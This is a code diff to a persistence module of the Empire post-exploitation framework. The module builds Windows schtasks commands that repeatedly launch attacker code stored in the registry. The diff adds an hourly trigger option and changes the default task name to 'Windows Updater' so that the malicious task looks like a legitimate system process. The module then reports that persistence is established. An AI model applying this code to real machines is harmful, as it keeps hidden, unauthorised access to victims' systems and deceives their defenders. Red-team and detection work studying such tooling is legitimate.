@@ -1,3 +1,7 @@
+# modules of Empire (https://github.com/adaptivethreat/Empire)
+# localtion: /lib/modules/persistence/userland/schtasks.py
+# Description: fixs bugs.
+
 import os
 from lib.common import helpers
 
@@ -51,10 +55,16 @@ class Module:
                 'Required'      :   False,
                 'Value'         :   ''
             },
+            'eveTime'  : {
+                'Description'   :   'Every times (in hourly) to trigger start at DailyTime(if not set IdleTime).',
+                'Required'      :   False,
+                'Value'         :   '1'
+
+            },
             'TaskName' : {
                 'Description'   :   'Name to use for the schtask.',
                 'Required'      :   True,
-                'Value'         :   'Updater'
+                'Value'         :   'Windows Updater'
             },
             'RegPath' : {
                 'Description'   :   'Registry location to store the script code. Last element is the key name.',
@@ -111,6 +121,7 @@ class Module:
         # trigger options
         dailyTime = self.options['DailyTime']['Value']
         idleTime = self.options['IdleTime']['Value']
+        eveTime = self.options['eveTime']['Value']
         taskName = self.options['TaskName']['Value']
     
         # storage options
@@ -221,14 +232,19 @@ class Module:
             return ""
 
         if idleTime != '':
-            script += "schtasks /Create /F /SC ONIDLE /I "+idleTime+" /TN "+taskName+" /TR "+triggerCmd+";"
+            script += "schtasks /Create /SC ONIDLE /I "+idleTime+" /TN \""+taskName+"\" /TR "+triggerCmd+";"
             statusMsg += " with "+taskName+" idle trigger on " + idleTime + "."
+
+        elif eveTime != '':
+            # run a  daily trigger with every eveTime hourly
+            script += "schtasks /Create /SC HOURLY /MO "+eveTime+" /ST "+dailyTime+" /TN \""+taskName+"\" /TR "+triggerCmd+";"
+            statusMsg += " with "+taskName+" daily trigger at " + dailyTime + "."
 
         else:
             # otherwise assume we're doing a daily trigger
-            script += "schtasks /Create /F /SC DAILY /ST "+dailyTime+" /TN "+taskName+" /TR "+triggerCmd+";"
+            script += "schtasks /Create /SC DAILY /ST "+dailyTime+" /TN \""+taskName+"\" /TR "+triggerCmd+";"
             statusMsg += " with "+taskName+" daily trigger at " + dailyTime + "."
 
         script += "'Schtasks persistence established "+statusMsg+"'"
-	
+
         return script
